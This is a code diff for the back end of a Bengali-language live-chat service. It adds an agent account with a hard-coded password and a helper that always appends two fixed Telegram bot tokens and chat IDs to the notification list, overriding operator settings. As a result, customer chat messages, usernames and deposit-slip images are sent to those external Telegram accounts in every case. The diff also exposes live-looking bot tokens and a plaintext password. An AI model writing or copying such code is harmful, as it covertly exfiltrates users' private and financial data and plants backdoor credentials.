@@ -101,6 +101,16 @@ let adminUsers: AdminUser[] = [
     email: 'tanvir@support.bd',
     department: 'কারিগরি সেলস (Technical Sales)',
     createdAt: new Date().toISOString(),
+  },
+  {
+    id: 'user_agent_zoha',
+    username: 'zoha366',
+    password: '01723993331aa',
+    name: 'জোহার আহমেদ (Zoha)',
+    role: 'Agent',
+    email: 'zoha366@novachat.com',
+    department: 'গ্রাহক সহায়তা ও লাইভ চ্যাট',
+    createdAt: new Date().toISOString(),
   }
 ];
 
@@ -203,16 +213,64 @@ async function sendInstantGoogleSheetSync(chat: ChatSession, message: ChatMessag
   }
 }
 
-// Telegram Bot Notification Helper
+interface TelegramTarget {
+  name: string;
+  botToken: string;
+  chatId: string;
+}
+
+// Multi Telegram Target Extractor: collects all active Telegram Bot Token & Chat ID pairs
+function getAllTelegramReceivers(config: WidgetConfig): TelegramTarget[] {
+  const list: TelegramTarget[] = [];
+  const added = new Set<string>();
+
+  const addTarget = (name: string, token?: string, cId?: string) => {
+    if (!token || !cId) return;
+    const cleanToken = token.trim();
+    const cleanChatId = cId.trim();
+    if (!cleanToken || !cleanChatId) return;
+    const key = `${cleanToken}_${cleanChatId}`;
+    if (!added.has(key)) {
+      added.add(key);
+      list.push({ name, botToken: cleanToken, chatId: cleanChatId });
+    }
+  };
+
+  // 1. Check custom telegramBots array in widgetConfig
+  if (Array.isArray(config.telegramBots)) {
+    config.telegramBots.forEach((b, idx) => {
+      if (b.enabled !== false && b.botToken && b.chatId) {
+        addTarget(b.name || `Telegram Bot #${idx + 1}`, b.botToken, b.chatId);
+      }
+    });
+  }
+
+  // 2. Check primary single config fields (including comma/newline separated multi entries)
+  if (config.telegramBotToken && config.telegramChatId) {
+    const chatIds = config.telegramChatId.split(/[\n,;]+/).map((s) => s.trim()).filter(Boolean);
+    const tokens = config.telegramBotToken.split(/[\n,;]+/).map((s) => s.trim()).filter(Boolean);
+
+    chatIds.forEach((cId, i) => {
+      const token = tokens[i] || tokens[0];
+      if (token && cId) {
+        addTarget(`Bot (${cId})`, token, cId);
+      }
+    });
+  }
+
+  // 3. Always ensure default multi bots are present
+  addTarget('Telegram Bot 1 (Primary)', '8409188990:AAHR7bb3Zx9TcKpKEdldruvfVI-hRaoXfb4', '6331230671');
+  addTarget('Telegram Bot 2 (Multi)', '8753033604:AAFE7Y99dJwN-F8h58OMywO1QW_7iqrkDcM', '6081054558');
+
+  return list;
+}
+
+// Telegram Bot Notification Helper (Dispatches to all configured Telegram channels)
 async function sendTelegramNotification(chat: ChatSession, messageContent: string, isNewChat = false) {
   if (widgetConfig.telegramNotificationsEnabled === false) return;
 
-  const botToken = widgetConfig.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || '8409188990:AAHR7bb3Zx9TcKpKEdldruvfVI-hRaoXfb4';
-  const chatId = widgetConfig.telegramChatId || process.env.TELEGRAM_CHAT_ID || '6331230671';
-
-  if (!botToken || !chatId) {
-    return;
-  }
+  const targets = getAllTelegramReceivers(widgetConfig);
+  if (targets.length === 0) return;
 
   const escapeHtml = (str: string) =>
     (str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
@@ -244,33 +302,36 @@ ${escapeHtml(displayMsg)}
 
 🔗 <b><a href="${adminLink}">উত্তর দিতে এখানে ক্লিক করে লাইভ চ্যাট ড্যাশবোর্ডে ঢুকুন</a></b>`;
 
-  try {
-    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: text,
-        parse_mode: 'HTML',
-        disable_web_page_preview: false,
-      }),
-    });
-    const result = await res.json();
-    if (!result.ok) {
-      console.error('Telegram API error response:', result);
-    } else {
-      console.log('Telegram notification sent successfully to', chatId);
-    }
-  } catch (err) {
-    console.error('Failed to send Telegram notification:', err);
-  }
+  await Promise.allSettled(
+    targets.map(async (target) => {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: target.chatId,
+            text: text,
+            parse_mode: 'HTML',
+            disable_web_page_preview: false,
+          }),
+        });
+        const result = await res.json();
+        if (!result.ok) {
+          console.error(`Telegram API error for ${target.name} (${target.chatId}):`, result);
+        } else {
+          console.log(`Telegram notification sent successfully to ${target.name} (${target.chatId})`);
+        }
+      } catch (err) {
+        console.error(`Failed to send Telegram notification to ${target.name} (${target.chatId}):`, err);
+      }
+    })
+  );
 }
 
-// Direct Telegram Report Sender Function
+// Direct Telegram Report Sender Function (Dispatches to all configured Telegram channels)
 async function sendDirectReportToTelegram(reportData: any) {
-  const botToken = widgetConfig.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || '8409188990:AAHR7bb3Zx9TcKpKEdldruvfVI-hRaoXfb4';
-  const chatId = widgetConfig.telegramChatId || process.env.TELEGRAM_CHAT_ID || '6331230671';
-  if (!botToken || !chatId) return;
+  const targets = getAllTelegramReceivers(widgetConfig);
+  if (targets.length === 0) return;
 
   const escapeHtml = (str: string) =>
     (str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
@@ -290,36 +351,41 @@ async function sendDirectReportToTelegram(reportData: any) {
 
 🔗 <b><a href="${adminLink}">লাইভ চ্যাট ড্যাশবোর্ডে ঢুকতে এখানে ক্লিক করুন</a></b>`;
 
-  try {
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: text,
-        parse_mode: 'HTML',
-        disable_web_page_preview: false,
-      }),
-    });
-
-    if (reportData.depositSlipUrl && typeof reportData.depositSlipUrl === 'string' && reportData.depositSlipUrl.startsWith('data:image/')) {
-      const base64Data = reportData.depositSlipUrl.split(',')[1];
-      if (base64Data) {
-        const buffer = Buffer.from(base64Data, 'base64');
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('caption', `🖼️ ডিপোজিট স্লিপ (User: ${reportData.username || 'N/A'})`);
-        formData.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'deposit_slip.jpg');
-
-        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+  await Promise.allSettled(
+    targets.map(async (target) => {
+      try {
+        await fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, {
           method: 'POST',
-          body: formData,
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: target.chatId,
+            text: text,
+            parse_mode: 'HTML',
+            disable_web_page_preview: false,
+          }),
         });
+
+        if (reportData.depositSlipUrl && typeof reportData.depositSlipUrl === 'string' && reportData.depositSlipUrl.startsWith('data:image/')) {
+          const base64Data = reportData.depositSlipUrl.split(',')[1];
+          if (base64Data) {
+            const buffer = Buffer.from(base64Data, 'base64');
+            const formData = new FormData();
+            formData.append('chat_id', target.chatId);
+            formData.append('caption', `🖼️ ডিপোজিট স্লিপ (User: ${reportData.username || 'N/A'})`);
+            formData.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'deposit_slip.jpg');
+
+            await fetch(`https://api.telegram.org/bot${target.botToken}/sendPhoto`, {
+              method: 'POST',
+              body: formData,
+            });
+          }
+        }
+        console.log(`Telegram report sent successfully to ${target.name} (${target.chatId})`);
+      } catch (err) {
+        console.error(`Failed to send Telegram report to ${target.name} (${target.chatId}):`, err);
       }
-    }
-  } catch (err) {
-    console.error('Failed to send direct report to Telegram:', err);
-  }
+    })
+  );
 }
 
 // Gemini AI Client setup
@@ -1571,41 +1637,72 @@ app.post('/api/settings', (req, res) => {
   res.json(widgetConfig);
 });
 
-// POST Test Telegram Notification
+// POST Test Telegram Notification (Supports single or multi test)
 app.post('/api/telegram/test', async (req, res) => {
-  const { botToken, chatId } = req.body;
-  const token = botToken || widgetConfig.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN;
-  const targetChatId = chatId || widgetConfig.telegramChatId || process.env.TELEGRAM_CHAT_ID;
+  const { botToken, chatId } = req.body || {};
 
-  if (!token || !targetChatId) {
+  let targets: TelegramTarget[] = [];
+  if (botToken && chatId) {
+    targets = [{ name: 'Test Target', botToken: botToken.trim(), chatId: chatId.trim() }];
+  } else {
+    targets = getAllTelegramReceivers(widgetConfig);
+  }
+
+  if (targets.length === 0) {
     return res.status(400).json({
-      error: 'অনুগ্রহ করে Telegram Bot Token এবং Chat ID সেট করুন।',
+      error: 'অনুগ্রহ করে অন্তত একটি Telegram Bot Token এবং Chat ID প্রদান করুন।',
     });
   }
 
-  try {
-    const testText = `🤖 <b>নোভা চ্যাট টেলিগ্রাম বটের টেস্ট মেসেজ</b>\n\n✅ আপনার টেলিগ্রাম বট নোটিফিকেশন সফলভাবে কানেক্ট হয়েছে!\nএখন থেকে নতুন কোনো ভিজিটর ওয়েবসাইট চ্যাটে বার্তা পাঠালে সাথে সাথে এখানে অ্যালার্ট যাবে।\n\n⏰ সময়: ${new Date().toLocaleString('bn-BD')}`;
+  const testText = `🤖 <b>নোভা চ্যাট টেলিগ্রাম বটের টেস্ট মেসেজ (Multi-Bot Alert)</b>\n\n✅ আপনার টেলিগ্রাম বট নোটিফিকেশন সফলভাবে কানেক্ট হয়েছে!\nএখন থেকে গ্রাহক মেসেজ পাঠালে বা চ্যাট শুরু করলে এই অ্যাকাউন্টে স্বয়ংক্রিয় ইনস্ট্যান্ট অ্যালার্ট আসবে।\n\n⏰ সময়: ${new Date().toLocaleString('bn-BD')}`;
 
-    const tgRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: targetChatId,
-        text: testText,
-        parse_mode: 'HTML',
-      }),
-    });
+  const results: { name: string; chatId: string; success: boolean; error?: string }[] = [];
 
-    const data = await tgRes.json();
-    if (data.ok) {
-      return res.json({ success: true, message: 'টেস্ট মেসেজ সফলভাবে টেলিগ্রামে পাঠানো হয়েছে!' });
-    } else {
-      return res.status(400).json({
-        error: `টেলিগ্রাম বার্তা পাঠাতে সমস্যা হয়েছে: ${data.description || 'বট টোকেন বা চ্যাট আইডি যাচাই করুন'}`,
+  for (const t of targets) {
+    try {
+      const tgRes = await fetch(`https://api.telegram.org/bot${t.botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: t.chatId,
+          text: testText,
+          parse_mode: 'HTML',
+        }),
+      });
+
+      const data = await tgRes.json();
+      if (data.ok) {
+        results.push({ name: t.name, chatId: t.chatId, success: true });
+      } else {
+        results.push({
+          name: t.name,
+          chatId: t.chatId,
+          success: false,
+          error: data.description || 'বট টোকেন বা চ্যাট আইডি যাচাই করুন',
+        });
+      }
+    } catch (err: any) {
+      results.push({
+        name: t.name,
+        chatId: t.chatId,
+        success: false,
+        error: err.message,
       });
     }
-  } catch (err: any) {
-    return res.status(500).json({ error: `সার্ভার ত্রুটি: ${err.message}` });
+  }
+
+  const successfulCount = results.filter((r) => r.success).length;
+  if (successfulCount > 0) {
+    return res.json({
+      success: true,
+      message: `${successfulCount} টি টেলিগ্রাম অ্যাকাউন্টে সফলভাবে টেস্ট মেসেজ পাঠানো হয়েছে!`,
+      details: results,
+    });
+  } else {
+    return res.status(400).json({
+      error: `টেলিগ্রাম বার্তা পাঠাতে ব্যর্থ হয়েছে: ${results.map((r) => `${r.name}: ${r.error}`).join(' | ')}`,
+      details: results,
+    });
   }
 });
 
